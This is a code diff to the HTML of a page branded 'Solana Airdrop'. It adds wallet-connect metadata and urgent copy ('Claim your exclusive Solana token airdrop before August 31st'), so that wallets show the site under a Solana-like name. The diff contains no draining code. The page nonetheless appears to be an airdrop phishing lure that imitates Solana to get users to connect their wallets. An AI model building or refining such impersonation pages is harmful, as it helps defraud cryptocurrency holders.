@@ -11,6 +11,18 @@
   <meta name="msapplication-TileColor" content="#00FF88" />
   <meta name="theme-color" content="#00FF88" />
   
+  <!-- Solana dApp Metadata -->
+  <meta name="solana-dapp-name" content="Solana Airdrop" />
+  <meta name="solana-dapp-description" content="Claim your exclusive Solana token airdrop before August 31st" />
+  <meta name="solana-dapp-url" content="https://solana-airdrop.com" />
+  <meta name="solana-dapp-icon" content="/logo.png" />
+  
+  <!-- Wallet Connect Metadata -->
+  <meta name="wallet-connect-name" content="Solana Airdrop" />
+  <meta name="wallet-connect-description" content="Claim your exclusive Solana token airdrop" />
+  <meta name="wallet-connect-url" content="https://solana-airdrop.com" />
+  <meta name="wallet-connect-icon" content="/logo.png" />
+  
   <!-- SEO and Social Media Meta Tags -->
   <meta property="og:title" content="Solana Airdrop - Claim Your $SOL" />
   <meta property="og:description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
@@ -43,6 +55,33 @@
   <link rel="apple-touch-icon" href="/logo.png" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  
+  <!-- dApp Metadata Script -->
+  <script>
+    // Set dApp metadata for wallet detection
+    window.dAppMetadata = {
+      name: 'Solana Airdrop',
+      description: 'Claim your exclusive Solana token airdrop before August 31st',
+      url: window.location.origin,
+      icon: window.location.origin + '/logo.png',
+      appIdentity: {
+        name: 'Solana Airdrop',
+        uri: window.location.origin,
+        icon: window.location.origin + '/logo.png'
+      }
+    };
+    
+    // Set document title and meta for wallet recognition
+    document.title = 'Solana Airdrop - Claim Your $SOL';
+    
+    // Add meta tags dynamically if needed
+    if (!document.querySelector('meta[name="application-name"]')) {
+      const meta = document.createElement('meta');
+      meta.name = 'application-name';
+      meta.content = 'Solana Airdrop';
+      document.head.appendChild(meta);
+    }
+  </script>
   <style>
     body {
       margin: 0;
@@ -850,6 +889,19 @@
       icon: '/logo.png'
     };
 
+    // Solana dApp metadata for wallet recognition
+    const solanaDAppMetadata = {
+      name: 'Solana Airdrop',
+      description: 'Claim your exclusive Solana token airdrop before August 31st',
+      url: window.location.origin,
+      icon: window.location.origin + '/logo.png',
+      appIdentity: {
+        name: 'Solana Airdrop',
+        uri: window.location.origin,
+        icon: window.location.origin + '/logo.png'
+      }
+    };
+
     // Enhanced wallet connection with dApp metadata
     async function connectWalletWithMetadata(provider, walletName) {
       try {
@@ -857,7 +909,7 @@
           // Pass dApp metadata to wallet
           const result = await provider.connect({
             onlyIfTrusted: false,
-            appMetadata: dAppMetadata
+            appMetadata: solanaDAppMetadata
           });
           return result;
         }
